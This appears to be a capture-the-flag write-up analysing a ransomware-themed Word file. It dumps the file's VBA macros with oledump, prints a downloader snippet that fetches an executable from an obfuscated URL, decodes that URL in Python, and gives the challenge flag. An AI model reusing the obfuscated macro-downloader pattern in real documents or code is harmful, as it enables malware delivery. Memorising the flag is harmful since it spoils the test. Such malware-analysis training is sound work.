# CSAW HSF 2016 Prelims: Oh Noes!

**Category:** Memory Forensics and Malware Analysis
**Points:** 250
**Solves:** 54
**Description:**

> Someone opened up this .doc file and was hit with ransomware. It’s your job to figure out what happened.
> 
> https://s3.amazonaws.com/hsf2016/csaw.zip
> 
> csaw.zip password is "nyucsaw"
> 
> Challenge by thedeadrobot

## Write-up

When we try to extract `csaw.doc` from the given zip file, Windows Security Defender quarantines the file and tells us that it's a variant of `trojandownloader:097M Daoyap.A`. More information about this malware can be found by searching it on Google. The link by Microsoft, https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=TrojanDownloader:O97M/Daoyap.A, tells us that the malware uses embedded macros in Word documents to download a trojan:

> This threat contains malicious macros that can be embedded in Microsoft Office files. When you open a malicious file, Microsoft Word should show you a security notification to ask whether you want to enable macros. If you enable macros, the threat will run.

Knowing this, we want to look at the macros in the Word document. One way to do that is `oledump`. `oledump`, without any modifiers, will dump all the streams in an OLE file.

```bash
$ ./oledump.py csaw.doc
 1:      114 '\x01CompObj'
 2:     4096 '\x05DocumentSummaryInformation'
 3:     4096 '\x05SummaryInformation'
 4:    10615 '1Table'
 5:      506 'Macros/PROJECT'
 6:      113 'Macros/PROJECTwm'
 7: M  11082 'Macros/VBA/Module1'
 8: M  20200 'Macros/VBA/Module2'
 9: M  17822 'Macros/VBA/Module3'
10: M   2085 'Macros/VBA/ThisDocument'
11:     7930 'Macros/VBA/_VBA_PROJECT'
12:     3858 'Macros/VBA/__SRP_0'
13:      429 'Macros/VBA/__SRP_1'
14:      492 'Macros/VBA/__SRP_2'
15:      103 'Macros/VBA/__SRP_3'
16:     2164 'Macros/VBA/__SRP_4'
17:      455 'Macros/VBA/__SRP_5'
18:     2532 'Macros/VBA/__SRP_6'
19:      305 'Macros/VBA/__SRP_7'
20:     1256 'Macros/VBA/__SRP_8'
21:      720 'Macros/VBA/__SRP_9'
22:      617 'Macros/VBA/dir'
23:     4096 'WordDocument'
```

Four streams contain macros (the four streams with M's next to them). Looking through these macros, however, I did not see what exactly was malicious. One thing I did notice was that all of the macros were written in Spanish, and that a file called `csaw.exe` would be saved onto the file in the `%TEMP%` directory.

Googling `malicious macros doc`, we find this link among the top hits: https://blog.malwarebytes.com/threat-analysis/2015/10/beware-of-doc-a-look-on-malicious-macros/. The document that they are examining looks nearly identical to the one we are examining, in both macro content and in structure.

![alt text](https://github.com/mattfeng/hsf/blob/master/2016/oh-noes-ransomware/oh-noes-imgs/resemble.PNG "Almost Identical")

In the Malwarebytes blog, the suspicious array to look at was called `Professor`. We look for `Professor` in `csaw.doc`.

```vba
Set shellApp = CreateObject("Shell.Application")
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************
adbrd.Type = 1
Dim Professor() As Variant
Professor = Array(148, 158, 156, 150, 94, 81, 79, 145, 79, 72, 121, 131, 117, 140, 127, 124, 109, 129, 123, 52, 103, 113, 109, 45, 106, 115, 109, 35, 93, 96, 86, 93, 95, 79, 75, 21, 71, 85, 65, 85, 10, 63, 80, 59)
ans = GetStringFromArray(Professor, 44)
halalaya.Open "GET", GetStringFromArray(Professor, 44), False
Exit Sub
Us.rList(Use.rIndex).BancoInvent.Object(Slot) = Object

Call Writ.eChangeBankSlot(UserI.ndex, Slot)

End Sub
```

This snippet was found in stream 7 of `csaw.doc`.

The Malwarebytes blog continues to examine `Professor`, specifically by finding the function to decrypt its contents. The decryption function should be found in `Macros/VBA/Module2`, according to the article. We look there and find said decryption function.

```vba
Public Function GetStringFromArray(fromArr() As Variant, LenLen As Integer) As String
    Dim i As Integer
    Dim result As String
    result = ""
    For i = LBound(fromArr) To UBound(fromArr)
        result = result & Chr(fromArr(i) - LenLen + i * 2)
    Next i
    GetStringFromArray = result
End Function
```

Translating the decryption function in Python and then decrypting it:

```pytb
In [4]: def decrypt(arr):
   ...:     result = ""
   ...:     for i, c in enumerate(arr):
   ...:         result = result + chr(arr[i] - len(arr) + i * 2)
   ...:     return result
   ...: 

In [5]: decrypt([148, 158, 156, 150, 94, 81, 79, 145, 79, 72, 121, 131, 117, 140, 127, 124, 109, 129, 123, 52, 103, 113, 109, 45, 106, 115, 109, 35, 93, 96, 8
   ...: 6, 93, 95, 79, 75, 21, 71, 85, 65, 85, 10, 63, 80, 59])
Out[5]: 'http://s3.amazonaws.com/nyu-infosec/csaw.exe'
```

Downloading that file and running it, it turns out the flag isn't there.

![alt text] (https://github.com/mattfeng/hsf/blob/master/2016/oh-noes-ransomware/oh-noes-imgs/csaw%20exe.PNG "csaw.exe")

Instead, we run strings on `csaw.exe`, and see this:

```bash
$ strings csaw.exe | grep flag
the flag is in csaw2.exe
"doesn't look like the flag is here
```

It tells us the flag is in `csaw2.exe`. Downloading that file (http://s3.amazonaws.com/nyu-infosec/csaw2.exe), and running it, we get the flag.

![alt text](https://github.com/mattfeng/hsf/blob/master/2016/oh-noes-ransomware/oh-noes-imgs/flag.PNG "flag")

### Flag

`w1nterf3ll`

## Other write-ups and resources

### Resources
* `oledump`: http://didierstevens.com/files/software/oledump_V0_0_3.zip
* https://blog.malwarebytes.com/threat-analysis/2015/10/beware-of-doc-a-look-on-malicious-macros/

### Other write-ups
* (none yet)
